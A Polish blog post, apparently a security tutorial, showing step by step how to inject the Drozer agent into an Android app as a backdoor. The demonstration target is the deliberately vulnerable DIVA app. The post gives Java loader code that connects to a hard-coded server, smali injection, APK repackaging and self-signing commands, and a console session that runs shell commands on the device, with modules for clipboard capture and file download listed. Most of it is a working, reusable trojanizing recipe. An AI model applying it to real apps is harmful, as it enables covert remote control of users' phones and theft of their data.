---
layout: post
title: "[PL] Backdoor na Androida w oparciu o narzędzie Drozer"
published: true
date: 2018-02-09
---

## Wstęp
Zapoznamy się ze sposobem na stworzenie backdoora oraz umieszczenie go w dowolnej aplikacji na platformie Android. Będzie on wykorzystywał narzędzie Drozer, które służy przede wszystkim do testowania bezpieczeństwa mobilnych aplikacji. Drozer działa w architekturze klient-serwer, a my użyjemy jego dwóch komponentów:
- **Drozer** (.deb albo Python .egg) - pełna wersja narzędzia, do zainstalowania na komputerze. Będzie pełnić rolę serwera, który posłuży do wydawania poleceń.

- **agent.jar** - klient napisany w Javie. Trafi do docelowej aplikacji razem z kodem wykorzystującym go do połączenia z serwerem.
 
Naszym celem będzie DIVA Android. Jest to aplikacja, w której celowo umieszczono wiele różnych podatności, co czyni z niej dobry materiał do ćwiczeń. Do napisania kodu obsługującego agent.jar wykorzystamy Android Studio. Zbudujemy w nim plik APK, a następnie zdekompilujemy używając narzędzia apktool. Uzyskamy w ten sposób kod w formacie smali. Tego samego narzędzia użyjemy do rekompilacji naszego celu. Umieścimy w nim plik JAR jako asset, a do klasy głównej aktywności dodamy kod ładujący go. Dzięki temu aplikacja już przy uruchomieniu będzie łączyła się z serwerem i czekała na polecenia.

Wymagane narzędzia i aplikacje:
* **Drozer** - [https://labs.mwrinfosecurity.com/tools/drozer/](https://labs.mwrinfosecurity.com/tools/drozer/)
* **agent.jar** - [https://raw.githubusercontent.com/mwrlabs/drozer/develop/src/drozer/lib/agent.jar](https://raw.githubusercontent.com/mwrlabs/drozer/develop/src/drozer/lib/agent.jar)
* **Android Studio** - [https://developer.android.com/studio/index.html#downloads](https://developer.android.com/studio/index.html#downloads)
* **JDK 8** -  [http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html](http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html)
* **apktool** - [https://ibotpeaches.github.io/Apktool/](https://ibotpeaches.github.io/Apktool/)
* **DIVA Android** - [http://payatu.com/damn-insecure-and-vulnerable-app/](http://payatu.com/damn-insecure-and-vulnerable-app/)

## Przygotowanie kodu
Uruchamiamy Android Studio i tworzymy nowy projekt, wybierając w kreatorze pustą aktywność. W klasie *MainActivity* implementujemy metodę *runAgent*, którą wywołamy na końcu *onCreate*. Do załadowania pliku JAR wykorzystamy klasę *DexClassLoader*. Wymaga ona podania ścieżki do pliku, jednak pliki znajdujące się w APK (assety) są odczytywane bezpośrednio z niego i uzyskanie ich ścieżek jest niemożliwe. Dlatego konieczne będzie skopiowanie agent.jar do pamięci wewnętrznej telefonu.

{% highlight x linenos %}
File agentJar = new File(getFilesDir(), "agent.jar");
InputStream is = getAssets().open("agent.jar");
byte[] jarContent = new byte[is.available()];
is.read(jarContent);
FileOutputStream fos = new FileOutputStream(agentJar);
fos.write(jarContent);
{% endhighlight %}           

Metoda *getFilesDir* wykorzystana w pierwszej linii zwraca ścieżkę do katalogu z plikami aplikacji. W drugiej linii otwieramy strumień do pliku znajdującego się w katalogu assets w APK.
Kolejne linie kopiują zawartość pliku do miejsca reprezentowanego przez zmienną *agentJar*.

Wiedząc, że *agentJar* posiada ścieżkę do istniejącego pliku, możemy utworzyć instancję *DexClassLoader*. Pozwala nam ona skorzystać z mechanizmu refleksji do stworzenia obiektu agenta i uruchomienia go.

{% highlight x linenos %}
DexClassLoader dexClassLoader = new DexClassLoader(agentJar.getAbsolutePath(), getCacheDir().getAbsolutePath(), null,
ClassLoader.getSystemClassLoader());
Class<?> aClass = dexClassLoader.loadClass("com.mwr.dz.Agent");
Constructor<?> constructor = aClass.getConstructor(String.class, int.class, Context.class);
Object agent = constructor.newInstance("192.168.0.199", 31415, this);
Method run = aClass.getMethod("run");
run.invoke(agent);
{% endhighlight %}

W piątej linii przekazujemy adres komputera, na którym zostanie uruchomiony serwer Drozera. To z nim połączy się zmodyfikowana aplikacja.
Drugi parametr to domyślny port, na którym działa Drozer. Ostatni to kontekst, który jest niezbędny do działania większości modułów.
Ostatnia linia to uruchomienie agenta, który spróbuje się połączyć z serwerem.

Kod dodatkowo opakowujemy w bloki *try* i *catch*, aby zapobiec crashowaniu aplikacji, gdyby próba odpalenia backdoora nie powiodła się. Całość prezentuje się następująco:

[MainActivity.java](https://raw.githubusercontent.com/LogicalTrust/materials/master/drozer-backdoor/MainActivity.java)

[![MainActivity.java](https://raw.githubusercontent.com/LogicalTrust/materials/master/drozer-backdoor/1.png)](https://raw.githubusercontent.com/LogicalTrust/materials/master/drozer-backdoor/1.png)

Z tak przygotowanego projektu budujemy paczkę, klikając *Build*, a następnie *Build APK(s)*.

## Umieszczenie backdoora w aplikacji

Aplikację, w której umieścimy backdoora możemy wyszukać na telefonie

{% highlight x %}
$ adb shell pm list packages -f -3 | grep diva
package:/data/app/jakhar.aseem.diva-1/base.apk=jakhar.aseem.diva
{% endhighlight %}

a następnie pobrać.
{% highlight x %}
$ adb pull /data/app/jakhar.aseem.diva-1/base.apk diva.apk
{% endhighlight %}

Pobraną aplikację oraz wcześniej przygotowaną paczkę rozpakowujemy narzędziem apktool. Daje nam to dostęp do struktury katalogów paczki oraz kodu w formacie smali.
{% highlight x %}
$ apktool d -o diva.out diva.apk
$ apktool d -o backdoorrunner.out ~/AndroidStudioProjects/BackdoorRunner/app/build/outputs/apk/debug/app-debug.apk
{% endhighlight %}

Konieczne jest teraz znalezienie głównej aktywności w rozpakowanej aplikacji. W tym celu otwieramy plik AndroidManifest.xml i odszukujemy aktywność, która posiada
{% highlight x %}
<intent-filter>
  <action android:name="android.intent.action.MAIN"/>
  <category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
{% endhighlight %}

W *backdoorrunner.out/smali/com/example/backdoorrunner/MainActivity.smali* znajduje się kod, który wcześniej napisaliśmy. Interesuje nas w nim metoda *runAgent*, którą w całości kopiujemy do *diva.out/smali/jakhar/aseem/diva/MainActivity.smali* oraz *onStart*, z której kopiujemy jedynie

{% highlight x %}
.line 27
invoke-direct {p0}, Lcom/example/backdoorrunner/MainActivity;->runAgent()V
{% endhighlight %}

i umieszczamy jako przedostatnią instrukcję w metodzie o tej samej nazwie. Numeracja z pierwszej linii nie musi się pokrywać z pozostałymi, oryginalnymi liniami. Jest wykorzystywana tylko do budowania czytelnych stack trace'ów i nie ma bezpośredniego wpływu na wykonanie kodu.

{% highlight x %}
.method protected onCreate(Landroid/os/Bundle;)V
[...]
    .line 20
    .local v0, "toolbar":Landroid/support/v7/widget/Toolbar;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->setSupportActionBar(Landroid/support/v7/widget/Toolbar;)V

    .line 27
    invoke-direct {p0}, Lcom/example/backdoorrunner/MainActivity;->runAgent()V

    .line 22
    return-void
.end method
{% endhighlight %}

Potrzebne jeszcze jest dostosowanie nazw pakietów do nowej aplikacji - wszystkie wystąpienia *com/example/backdoorrunner/MainActivity zmieniamy* na *jakhar/aseem/diva/MainActivity*.

Powinniśmy uzyskać taki kod: [MainActivity.smali](https://raw.githubusercontent.com/LogicalTrust/materials/master/drozer-backdoor/MainActivity.smali)

Kolejną rzeczą do wykonania w tym kroku, jest umieszczenie agent.jar w *diva.out/assets*
{% highlight x %}
$ wget -P diva.out/assets https://raw.githubusercontent.com/mwrlabs/drozer/develop/src/drozer/lib/agent.jar
{% endhighlight %}

Na koniec upewniamy się, że w AndroidManifest.xml jest uprawnienie pozwalające na korzystanie z sieci. W przypadku braku należy je dodać. Bez niego nasz backdoor nie byłby w stanie połączyć się z serwerem.

{% highlight x %}
<uses-permission android:name="android.permission.INTERNET"/>
{% endhighlight %}

## Zbudowanie nowego APK

Po dokonaniu wszystkich modyfikacji możemy przystąpić do zbudowania paczki.
{% highlight x %}
$ apktool b -o diva-backdoor.apk diva.out
{% endhighlight %}

Do tego konieczne jeszcze jest podpisanie aplikacji. Bez tego instalacja nie będzie możliwa.

{% highlight x %}
$ keytool -genkey -v -keystore android.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000
$ jarsigner -keystore android.keystore diva-backdoor.apk android
{% endhighlight %}

Android wykorzystuje certyfikaty tylko do rozróżnienia twórców aplikacji. Nie muszą być one podpisane przez CA. Jest to zabezpieczenie przed instalacją nowej, potencjalnie szkodliwej wersji aplikacji, przygotowanej przez kogoś innego niż pierwotnego autora. Nie jest to jednak zabezpieczenie idealne. Na przestrzeni lat znaleziono wiele luk w implementacji tego mechanizmu. Jedną z nich był błąd o numerze 8219321. Dotyczył on niepoprawnej obsługi plików APK, które zawierały w sobie pliki o powtarzających się nazwach. Sprawdzana była sygnatura tylko tego, który występował jako pierwszy, a następnie na telefonie instalowany był drugi plik. Pozwalało to przemycać w APK niebezpieczną zawartość, która nie była weryfikowana, a mimo to trafiała do pamięci telefonu.

Instalujemy aplikację na telefonie. Trzeba pamiętać o odinstalowaniu poprzedniej wersji, jeśli nie dysponujemy żadnym błędem pozwalającym na instalację fałszywej aplikacji.
{% highlight x %}
$ adb install diva.out
{% endhighlight %}

Uruchomienie i przejęcie kontroli

Serwer uruchamiamy wpisując
{% highlight x %}
$ drozer server start
Starting drozer Server, listening on 0.0.0.0:31415
2017-08-13 15:22:34,652 - drozer.server.protocols.drozerp.drozer - INFO - accepted connection from 2lrbgebepd3sv
{% endhighlight %}

[![drozer server start](https://raw.githubusercontent.com/LogicalTrust/materials/master/drozer-backdoor/2.png)](https://raw.githubusercontent.com/LogicalTrust/materials/master/drozer-backdoor/2.png)

Ostatnia linia to log, który powinniśmy ujrzeć po uruchomieniu aplikacji z backdoorem. Oznacza ona udane połączenie.

Teraz pozostaje już tylko uruchomienie konsoli, która daje możliwość odpalania modułów w kontekście zmodyfikowanej aplikacji.

{% highlight x %}
$ drozer console connect 2lrbgebepd3sv
            ..                    ..:.
           ..o..                  .r..
            ..a..  . ....... .  ..nd
              ro..idsnemesisand..pr
              .otectorandroidsneme.
           .,sisandprotectorandroids+.
         ..nemesisandprotectorandroidsn:.
        .emesisandprotectorandroidsnemes..
      ..isandp,..,rotectorandro,..,idsnem.
      .isisandp..rotectorandroid..snemisis.
      ,andprotectorandroidsnemisisandprotec.
     .torandroidsnemesisandprotectorandroid.
     .snemisisandprotectorandroidsnemesisan:
     .dprotectorandroidsnemesisandprotector.

drozer Console (v2.3.4)
dz>
{% endhighlight %}

Wpisując *list* wyświetlimy wszystkie dostępne moduły. Wśród nich warto zwrócić uwagę na:
* *app.package.list* - wyświetla listę aplikacji zainstalowanych na telefonie
* *app.package.info* - wyświetla szczegółowe informacje o aplikacjach zainstalowanych na telefonie
* *app.package.attacksurface* - pokazuje wektor ataku na aplikację
* *information.deviceinfo* - wyświetla informacje na temat urządzenia
* *post.capture.clipboard* - pobiera zawartość schowka
* *shell.exec - wykonuje* polecenie w powłoce
* *tools.file.download* - pobiera plik z urządzenia


Za pomocą *help* wyświetlamy szczegółowego informacje o wybranym module
{% highlight x %}
dz> help shell.exec
usage: run shell.exec [-h] command

Execute a single Linux command from the context of drozer.

Last Modified: 2012-11-06
Credit: MWR InfoSecurity (@mwrlabs)
License: BSD (3 clause)

positional arguments:
  command     the Linux command to execute

optional arguments:
  -h, --help
{% endhighlight %}

A uruchamiamy go wpisując *run*
dz> run shell.exec "uname -a"
{% highlight x %}
Linux localhost 3.10.49-11174248 #1 SMP PREEMPT Wed Apr 12 15:26:53 KST 2017 armv7l 
{% endhighlight %}

[![drozer connected](https://raw.githubusercontent.com/LogicalTrust/materials/master/drozer-backdoor/3.png)](https://raw.githubusercontent.com/LogicalTrust/materials/master/drozer-backdoor/3.png)

